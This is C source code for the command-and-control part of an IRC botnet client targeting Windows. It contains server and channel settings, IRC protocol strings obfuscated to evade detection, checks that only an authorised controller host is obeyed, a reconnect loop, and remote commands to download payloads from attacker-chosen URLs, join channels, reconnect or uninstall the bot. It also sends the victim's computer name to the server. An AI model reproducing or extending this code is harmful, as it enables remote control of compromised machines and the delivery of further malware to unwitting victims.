

#include "shared.h"


typedef struct 
{
	char *host;
	unsigned short port;
	char *password;
} ircconnect_s;







char cfg_botversion[] = "xfz";

ircconnect_s ircconnect[] =
{
	{"SERV", 4598, ""},
	{NULL, 0, NULL}
};

unsigned long cfg_reconnectsleep = 5000; 
unsigned long cfg_ircmaxwaittime = 600; 

char cfg_ircchannel[] = "#OLDasper2";
char cfg_ircchanpass[] = "skankyho";
char cfg_irchost[] = "S";
char cfg_ircorderprefix[] = ".";



static char string_nick[] = "\xAE\xA9\xA3\xAB";
static char string_join[] = "\xAA\xAF\xA9\xAE";
static char string_part[] = "\xB0\xA1\xB2\xB4";
static char string_quit[] = "\xB1\xB5\xA9\xB4";
static char string_pass[] = "\xB0\xA1\xB3\xB3";
static char string_ping[] = "\xB0\xA9\xAE\xA7";
static char string_pong[] = "\xB0\xAF\xAE\xA7";
static char string_user[] = "\xB5\xB3\xA5\xB2";
static char string_privmsg[] = "\xB0\xB2\xA9\xB6\xAD\xB3\xA7";


static char string_reconnect[] = "Reconnecting...";
static char string_disconnect[] = "Disconnecting...";
static char string_remove[] = "Removing...";
static char string_download_failed[] = "Thread creation failed.";





thread_s		threads[MAX_THREADS];
BOOL			silent_main = FALSE;
BOOL			silent_all = FALSE;


BOOL NET_Initialize()
{
	WSADATA WSAdata;

	if (WSAStartup(MAKEWORD(2, 2), &WSAdata) != 0) 
	{
#ifdef DEBUG
		printf("WSA Error!\n");
#endif
		return FALSE;
	}
	else
		return TRUE;
}


int IRC_Connect(char *host, unsigned short port)
{
	unsigned int		resv_host;
	struct sockaddr_in	address;
	SOCKET				sock;

#ifdef DEBUG
	printf("Connecting to: %s:%d\n", host, port);
#endif

	resv_host = Resolve(host);
	if (resv_host == 0)
		return -1;

	address.sin_addr.s_addr = resv_host;
	address.sin_family = AF_INET;
	address.sin_port = htons(port);

	if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
		return -2;

	if (connect(sock, (struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR)
		return -3;
	else
		return sock;
}


int IRC_Send(SOCKET sock, ircmessage msg, char *buffer, char *to)
{
	char	temp[64] = {0}, 
			buff[MAX_LINE];
	int		len;

	if (msg == MSG_PASS)
	{
		strncpy(temp, string_pass, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s\r\n", Decode(temp), buffer);
	}
	else if (msg == MSG_NICK)
	{
		strncpy(temp, string_nick, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s\r\n", Decode(temp), buffer);
	}
	else if (msg == MSG_USER)
	{
		strncpy(temp, string_user, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s \"\" \"%s\" :%s\r\n", 
			Decode(temp), buffer, buffer, getenv("COMPUTERNAME"));
	}
	else if (msg == MSG_PONG)
	{
		strncpy(temp, string_pong, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s\r\n", Decode(temp), buffer);
	}
	else if (msg == MSG_JOIN)
	{
		strncpy(temp, string_join, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s %s\r\n", Decode(temp), buffer, to);
	}
	else if (msg == MSG_PART)
	{
		strncpy(temp, string_part, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s %s %s\r\n", Decode(temp), buffer, to);
	}
	else if (msg == MSG_PRIVMSG)
	{
		if (silent_all)
			return 1;
		else if (silent_main && !strcmp(to, cfg_ircchannel))
			return 1;
		else
		{
			strncpy(temp, string_privmsg, sizeof(temp) - 1);
			_snprintf(buff, sizeof(buff) - 1, "%s %s :%s\r\n", Decode(temp), to, buffer);
		}
	}
	else if (msg == MSG_QUIT)
	{
		strncpy(temp, string_quit, sizeof(temp) - 1);
		_snprintf(buff, sizeof(buff) - 1, "%s :%s\r\n", Decode(temp), buffer);
	}
	else
		
		return 0;

	memset(temp, 0, sizeof(temp));

#ifdef DEBUG
	printf("Out: %s\n", buff);
#endif

	len = send(sock, buff, strlen(buff), 0);

	memset(buff, 0, sizeof(buff));

	return len;
}


int IRC_Login(SOCKET sock, char *password, char *nick, char *user)
{
	int		ret;

	if (password[0] != 0)
		if ((ret = IRC_Send(sock, MSG_PASS, password, NULL)) == SOCKET_ERROR)
			return ret;

	if ((ret = IRC_Send(sock, MSG_NICK, nick, NULL)) == SOCKET_ERROR)
		return ret;

	if ((ret = IRC_Send(sock, MSG_USER, user, NULL)) == SOCKET_ERROR)
		return ret;

	return 1;
}


int IRC_CheckTimeout(SOCKET sock)
{
	struct timeval		timeout;
	fd_set				fd;

	timeout.tv_sec = cfg_ircmaxwaittime;
	timeout.tv_usec = 0;

	FD_ZERO(&fd); 
	FD_SET(sock, &fd);

	return select(sock, &fd, NULL, NULL, &timeout);
}


BOOL IRC_IsOrder(char *order)
{
	if (!strncmp(order, cfg_ircorderprefix, strlen(cfg_ircorderprefix)))
	{
		
		memmove(order, order + strlen(cfg_ircorderprefix), strlen(order));

		return TRUE;
	}
	else
		return FALSE;


}


BOOL IRC_CheckHost(char *master)
{
	char	*host;

	host = strchr(master, '@');
	if (host == NULL)
		return FALSE;

	if (!strcmp(host + 1, cfg_irchost))
		return TRUE;
	else
		return FALSE;
}


int IRC_ParseSingleCommand(SOCKET sock, char **word, int p, int words, char *from)
{
#ifdef DEBUG
	int		i;

	printf("Command from %s: ", from);
	for (i = 0; i < words; i ++)
	{
		if (i == 0)
			printf("%s ", word[p]);
		else
			printf("%s ", word[p + i]);
	}
	printf("\n\n");
#endif
	

	if (words < 1)
		return 1;


	else if (!strcmp(word[p], "r"))
	{
		IRC_Send(sock, MSG_QUIT, string_reconnect, NULL);

		return -2;
	}


	else if (!strcmp(word[p], "rm!"))

	{
		IRC_Send(sock, MSG_QUIT, string_remove, NULL);

		return -5;
	}


	else if (words < 2)
		return 1;

	else if (!strcmp(word[p], "j"))

	{
		IRC_Send(sock, MSG_JOIN, word[p + 1], NULL);

		return 1;
	}


	else if (!strcmp(word[p], "dl"))
	{
		download_s dl;

		_snprintf(dl.channel, sizeof(dl.channel) - 1, "%s", from);
		dl.ircsock = sock;

		dl.mode = atoi(word[p + 1]);
		_snprintf(dl.url, sizeof(dl.url) - 1, "%s", word[p + 2]);

		if (words == 4)
			_snprintf(dl.destination, sizeof(dl.destination) - 1, "%s", word[p + 3]);
		else
			dl.destination[0] = 0;

		dl.tnum = Thread_Add(T_DOWNLOAD);

		if ((threads[dl.tnum].tHandle = Thread_Start(DL_Thread, &dl, FALSE)) == NULL)
			IRC_Send(sock, MSG_PRIVMSG, string_download_failed, from);

		return 1;
	}

	else if (words < 4)
		return 1;

	else if (words < 5)
		return 1;

	


	else if (words < 6)
		return 1;



	else
		return 1;
}	


int IRC_ParseAllCommands(SOCKET sock, char **word)
{
	int		i, 
			k, 
			pos,
			ret;
	char	*p,
			from[128] = {0};

	if (!strcmp(word[1], "332"))
		i = 4;
	else
		i = 3;

	
	if (word[i-1][0] != '#')
	{
		p = strchr(word[0], '!');
		*p = 0;
		strncpy(from, word[0] + 1, sizeof(from) - 1);
	}
	else
		strncpy(from, word[i-1], sizeof(from) - 1);

	
	memmove(word[i], word[i] + 1, strlen(word[i]));

	k = i + 1;
	pos = i;
	while (word[k] != NULL && k < MAX_WORDS)
	{
		if (IRC_IsOrder(word[k]))
		{
			if ((ret = IRC_ParseSingleCommand(sock, word, pos, k - pos, from)) < 0)
				return ret;

			pos = k;
		}
		k++;
	}

	return IRC_ParseSingleCommand(sock, word, pos, k - pos, from);
}


int IRC_Parse(SOCKET sock, char *line)
{
	char	*word[MAX_WORDS],
			temp[64] = {0};
	int		i = 0;

#ifdef DEBUG
	printf("In: %s\n\n", line);
#endif

	if (strstr(line, "MOTD") != NULL)
		return IRC_Send(sock, MSG_JOIN, cfg_ircchannel, cfg_ircchanpass);

	word[i] = strtok(line, " ");
	while (word[i] != NULL)
	{
		i++;
		if (i == MAX_WORDS)
			break;
		word[i] = strtok(NULL, " ");
	}

	strncpy(temp, string_ping, sizeof(temp) - 1);
	if (!strcmp(word[0], Decode(temp)))
	{
		memset(temp, 0, sizeof(temp));
		return IRC_Send(sock, MSG_PONG, word[1], NULL);
	}

	if (!strcmp(word[1], "433"))
		return IRC_Send(sock, MSG_NICK, GenerateNick(), NULL);

	strncpy(temp, string_privmsg, sizeof(temp) - 1);
	if (!strcmp(word[1], Decode(temp)))
	{
		if (IRC_CheckHost(word[0]) && IRC_IsOrder(word[3] + 1))
			return IRC_ParseAllCommands(sock, word);
	}

	if (!strcmp(word[1], "332"))
	{
		if (IRC_IsOrder(word[4] + 1))
			return IRC_ParseAllCommands(sock, word);
	}

	return 0;
}


int IRC_Listen(SOCKET sock)
{
	int		ret, 
			len,
			l;
	char	buffer[MAX_RECEIVE_BUFFER];

	while (sock > 0)
	{
		len = 0;
		memset(buffer, 0, sizeof(buffer));
		while ((ret = IRC_CheckTimeout(sock)) > 0)
		{
			if (len == MAX_RECEIVE_BUFFER - 1)
				break;
			l = recv(sock, buffer + len, 1, 0);
			if (l <= 0)
				return 0;
			len += l;
			if (buffer[len-1] == '\r' || buffer[len-1] == '\n')
				break;
		}
		
		if (ret <= 0)
			return ret;
		else if (len < 2)
			continue;
		else
		{
			buffer[len-1] = 0;
			if ((ret = IRC_Parse(sock, buffer)) < 0)
				return ret;
		}
	}

	return sock;
}


int IRC_Begin()
{
	int			ircsock;
	int			i = 0, 
				ret = 1,
				tries = 0;

	while (1)
	{
		if (ircconnect[i].host == NULL)
		{
			i = 0;
			tries++;

		}

		if ((ircsock = IRC_Connect(ircconnect[i].host, ircconnect[i].port)) > 0)
		{
			i = 0;
			tries = 0;
			if (IRC_Login(ircsock, ircconnect[i].password, GenerateNick(), GenerateRandomLetters(5)))
			{
				ret = IRC_Listen(ircsock);

				switch (ret)
				{
				case 0:
#ifdef DEBUG
					printf("IRC connection timeout or closed by remote host.\n");
#endif
					break;
				case -1:	
#ifdef DEBUG
					printf("IRC socket error occured.\n");
#endif
					break;
				case -2:
#ifdef DEBUG
					printf("IRC order: reconnect to same server.\n");
#endif
					break;
				case -3:
#ifdef DEBUG
					printf("IRC order: reconnect to next server.\n");
#endif
					i++;
					break;
				case -4:
#ifdef DEBUG
					printf("IRC order: disconnect.\n");
#endif
					closesocket(ircsock);
					return ret;
				case -5:
#ifdef DEBUG
					printf("IRC order: remove.\n");
#endif
					closesocket(ircsock);
					return ret;
				default:
#ifdef DEBUG
					printf("Unknown IRC error.\n");
#endif

					break;
				}

				closesocket(ircsock);
			}
		}
		else
		{
#ifdef DEBUG
			switch (ircsock)
			{
			case -1:
				printf("Failed to resolve host.\n");
				break;
			case -2:
				printf("IRC socket initialization failed.\n");
				break;
			case -3:
				printf("Failed to connect to IRC server: %s:%d\n", ircconnect[i].host, ircconnect[i].port);
				break;
			default:
				printf("Unknown IRC socket error.\n");
			}
#endif
			i++;
		}

		Sleep(cfg_reconnectsleep);
	}

	
}


DWORD WINAPI IRC_Thread(LPVOID param)
{
#ifndef DEBUG
	HANDLE mutex;
#endif

	if (!NET_Initialize())
		ExitThread(0);

#ifndef DEBUG
	mutex = CreateMutex(NULL, FALSE, cfg_mutex);
#endif

	srand(GetTickCount());

	Thread_Prepare();

	if (IRC_Begin() == -5)
		SC_StopOrUninstall(TRUE);
	else
		SC_StopOrUninstall(FALSE);

	WSACleanup();
#ifndef DEBUG
	ReleaseMutex(mutex);
#endif
	ExitThread(0);
}

